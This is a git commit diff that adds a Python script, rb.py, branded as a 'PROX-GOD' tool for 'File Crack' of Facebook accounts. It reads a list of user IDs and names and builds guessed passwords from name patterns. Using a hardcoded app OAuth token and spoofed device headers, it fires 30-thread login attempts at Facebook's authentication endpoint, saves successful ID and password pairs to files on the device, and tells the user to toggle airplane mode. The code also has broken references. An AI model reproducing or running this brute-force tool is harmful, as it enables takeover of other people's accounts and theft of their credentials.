5cba21cd8cca531d723fa37091d74de9bfc7fb0c
rbrahul24 <119988259+rbrahul24@users.noreply.github.com>
2023-03-09 15:02:46 +0545

    Update rb.py

--- rb.py
+++ rb.py
@@ -1,1 +1,284 @@
 
+import os
+        
+os.system('clear')
+print('loading Modules ...\n')
+
+try:
+    import requests
+except ImportError:
+    print('\n  installing requests ...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+
+try:
+    import bs4
+except ImportError:
+    print('\n installing bs4 ...\n')
+    os.system('pip install bs4')
+try:import urllib3
+except:cmd("python -m pip install --force-reinstall urllib3")
+try:import urllib3
+except:cmd("python -m pip install urllib3")
+darkweb = urllib3.PoolManager()
+from urllib.request import Request, urlopen
+import requests, os, re, bs4,platform, sys, json, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time
+from concurrent.futures import ThreadPoolExecutor as xerxxdtread
+from bs4 import BeautifulSoup
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+sagent2 = []
+sagent = []
+methods = []
+totaldmp = 0
+srange = 0
+loop = 0
+my_Token = platform.platform().replace('Linux','').replace('libc','').replace('with','').replace('-','').replace('.','').replace('+','').upper()[::-1]+str(os.geteuid()) + str(os.getlogin()).replace('_','').upper()[::-1].replace('A0U','@XERX')
+
+haaa = 'NB2HI4DTHIXS64TB'
+S = '\033[1;37m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = '\x1b[38;5;48m'
+Z = '\033[1;33m'
+hcc = 'O4XGO2LUNB2WE5LTM'
+
+def sleep(s):
+    for e in s + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+for agent in range(10000):
+    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/533.1'
+    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    sagent.append(fullagnt)
+    
+def DEL_T():
+    and_vers = random.randint(4,12)
+    and_mod = random.choice(get)
+    and_id = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
+    app_vercode = str(random.randint(000000000,999999999))
+    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
+    ua = f'Davik/2.1.0 (Linux; U; Android {and_vers}.0.0; '+'Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]'
+    return ua
+
+        
+hjj = 'VZGG33OORSW45BOMN'
+sys.stdout.write('\x1b]2; RXN0.8\x07')
+def clear():
+    os.system("clear")
+       
+def clear():
+    if "linux" in sys.platform.lower():
+        try:os.system("clear")
+        except:pass
+    elif "win" in sys.platform.lower():
+        try:os.system("cls")
+        except:pass
+    else:
+        try:os.system("clear")
+        except:pass
+
+logo ="""
+d8888b. d8888b.  .d88b.  db    db         d888b   .d88b.  d8888b. 
+88  `8D 88  `8D .8P  Y8. `8b  d8'        88' Y8b .8P  Y8. 88  `8D 
+88oodD' 88oobY' 88    88  `8bd8'         88      88    88 88   88 
+88~~~   88`8b   88    88  .dPYb.  C8888D 88  ooo 88    88 88   88 
+88      88 `88. `8b  d8' .8P  Y8.        88. ~8~ `8b  d8' 88  .8D 
+88      88   YD  `Y88P'  YP    YP         Y888P   `Y88P'  Y8888D'               
+[+]==============================================
+[+] OWNER	 :  PRESHAK BHATTARAI
+[+] COUNTRY	 :  NEPAL 
+[+] GITHUB	 :  PROX-GOD
+[+] TOOL STATUS  :  TRIAL
+[+] TOOL VIRSION :  0.1
+[+]=============================================="""
+
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print('\n')
+        print(47*'-')
+        print(' The Process has been Complete...')
+        print(' TOTAL OK: %s' % str(len(oks)))
+        print(' TOTAL CP: %s' % str(len(cps)))
+        print(47*'-')
+        input("Press enter to back PROX Menu ")
+        exit()
+
+def rxn():
+    os.system('clear')
+    print(logo)
+    print(f'[1] File Crack')
+    print(47*'-')
+    select = input('Select Menu: ')
+    if select =='1':
+        method_crack()
+    else:
+        print('select correctly ')
+        rxn()
+ 
+def method_crack():
+    global methods
+    os.system('clear')
+    print(logo)
+    print(f'[1] Method 1 ')
+    print(f'[2] Method {2}') #yesma aafaile add hana hai
+    print(47*'-')
+    xerxinput=input('select :- ')   
+    if xerxinput =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    else:
+        print(' aafaile le arko add hana hai')
+        
+
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        os.system('clear')
+        print(logo)
+        self.file = input('Put File Name : ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print('Opps File Not Found ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print('Try Again ...')
+            time.sleep(2)
+            main_crack().crack(id)
+            
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[PROX] {loop} | OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            loop+=1
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                ua = DEL_T()
+                ads = str(uuid.uuid4())
+                token = '350'+'685531728|62f8ce'+'9f74b12f84c123cc23437a4a32'
+                jz = random.choice(['28','29','210'])+''.join(random.choice(digits) for _ in range(2))
+                mac = str(uuid.uuid4()).replace('-','')[0:25]
+                sim_code = str(random.randint(2e4,4e4))
+                x_fb = str(random.randint(2e7,3e7))
+                device_id = str(uuid.uuid4())
+                data = {'adid': ads, 'email': sid, 'password': ps, 'cpl': 'true', 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'format': 'json', 'device_id': device_id, 'family_device_id': device_id, 'session_id': device_id, 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'bn_IN', 'client_country_code': 'IN', 'advertising_id': device_id, 'fb_api_req_friendly_name': 'authenticate'}
+                head = {'Connection': 'keep-alive', 'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','Host': 'b-graph.facebook.com', 'x-fb-connection-bandwidth': x_fb, 'x-fb-net-hni': jz, 'X-fb-sim-hni': jz, 'X-FB-Connection-Quality': 'EXCELLENT', 'x-fb-connection-type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent':ua , 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'Content-Length': '530'}
+                q = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
+                if 'session_key' in q:
+                    print(f"\r{R} [PROX-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/PROX_OK.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    print(f"\r{A} [PROX-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/PROX_CP.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                else:
+                    continue
+                #time.sleep(31)
+            
+            loop+=1
+        except requests.exceptions.ConnectionError:
+             self.methodA(sid, name, ps)
+            
+
+
+            
+    def pasw(self):
+        os.system("clear")
+        print(logo)
+        print(f"\t{S} Passwords Menu")
+        print(47*'-')
+        print('[1] Crack With Choice Pass [First last,Etc]')
+        
+        print('[0] Back')
+        print(47*'-')
+        psw = input('Select Password: ')  
+        
+        
+        if psw =='1':
+            os.system("clear")
+            pw = []
+            print(logo)
+            print(f'{S} Put limit between 1 to 20')
+            sl = int(input('How many password do you want to add?: '))
+            os.system("clear")
+            print(logo)
+            print(f'{S} [Example: first123,last786,firstlast,last,ETC]')
+            print('')
+            if sl =='':
+                print('\n Put limit between 1 to 20')
+            elif sl > 20:
+                print('\nPassword limit Should Not Be Greater Than 20')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'Password {sr+1}: '))
+            os.system("clear")
+            print(logo)
+            print(f"\r{A}Use flight (airplane) mode before use {S}")
+            print(47*"-")
+            print(f'{S} Total IDs : %s ' % len(self.id))
+            print(f'{S} Cracking Started...')
+            print(47*"-")
+            with xerxxdtread(max_workers=30) as xerx69:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                xerx69.submit(self.methodA, uid, name, pwx)
+                            
+                   except:pass
+            result(oks,cps)
+        elif psw =='0':
+            exit()
+        else:
+            print('\nSelect Valid Option ...')
+            self.pasw() 
+               
+
+rxn()
